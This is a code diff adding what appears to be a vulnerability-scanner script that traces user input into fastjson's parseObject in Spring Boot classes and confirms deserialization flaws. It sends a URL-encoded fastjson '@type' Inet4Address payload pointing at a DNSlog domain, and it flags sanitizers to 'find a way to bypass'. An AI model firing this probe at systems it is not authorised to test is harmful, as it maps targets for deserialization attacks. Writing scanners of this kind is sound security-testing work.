@@ -1,0 +1,78 @@
+#include SpringBoot/utils/SpringUtils.cheetah
+#include SpringBoot/filiter/filiter.cheetah
+
+function judgeFastjson(api){
+	domain = getDnsLogDomain();
+	res1 = HttpGet(api."%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22".domain."%22%7D",cookie);
+	Sleep(1000);
+	if(getDnsLogRecord() != "[]"){
+		return 1;
+	}
+	return 0;
+}
+function trackFastjson(className,methodName,url,argIndex){
+	array allNode;
+	allNode = TrackVarIntoFun(className,methodName,argIndex,"com/alibaba/fastjson/JSONObject","parseObject",0,1);
+	size = GetArrayNum(allNode);
+	if(ToInt(size-1) < 0){return 0;}
+	i = 0;
+	print(methodName.":fastjson反序列化 白盒测试调用链跟踪:");
+	cc = 7;
+	cs = 1;
+	while(i < size){
+		sentence = GetJavaSentence(allNode[i]);
+		noSan = filter(sentence,GetTrackName(allNode[i]));
+		if(noSan == 0){cc = 5;cs = 5;}
+		if(i == ToInt((size-1))){
+			if(cc != 5){cs = 2;cc = 3;}
+		}else{}
+		if(noSan == 0){
+			printcolor("[-]",6);printcolor("想办法绕过此类：",4);
+		}else{
+			printcolor("[+]",1);
+		}
+		printcolor(GetClassName(GetNodeClassName(allNode[i]))."   ",cc);
+		printcolor(sentence.StrRN(),cs);
+		i = ToInt(i+1);
+	}
+	if(cc != 5){
+		printcolor("白盒测试发现此调用链可能存在漏洞，生成测试链接进行黑盒测试".StrRN(),7);
+		an = GetClassMethodAnnotation(className,methodName);
+		var argName;
+		try{
+			arg_an = GetClassMethodArgAnnotation(className,methodName,0);
+			argName = getSpringAnnotationValue(arg_an);
+		}catch(){
+			argName = GetClassMethodArgName(className,methodName,0);
+		}
+		if(argName != ""){
+			api = url.getSpringAnnotationValue(an)."?".argName."=";
+			if(judgeFastjson(api) == 1){
+				printcolor("[+]生成测试链接:".api."   测试存在fastjson反序列化漏洞!".StrRN(),3);
+			}else{
+				printcolor("[-]生成测试链接:".api."   测试不存在fastjson反序列化漏洞!请自行测试。".StrRN(),5);
+			}
+		}else{
+			printcolor("测试链接生成失败,error:未找到参数入口!".StrRN(),5);
+		}
+	}
+	
+	return 0;
+}
+function FastjsonTrack(className){
+	an = GetClassAnnotation(className);
+	classPath = baseUrl.getSpringAnnotationValue(an);
+	methods = GetAllMethodName(className);
+	size = GetArrayNum(methods);
+	i = 0;
+	while(i < size){
+		argCnt = GetMethodArgCnt(className,methods[i]);
+		j = 0;
+		while(j < argCnt){
+			if(methods[i] != "<init>"){trackFastjson(className,methods[i],classPath,j);}
+			j = ToInt(j+1);
+		}
+		i = ToInt(i+1);
+	}
+	return 0;
+}
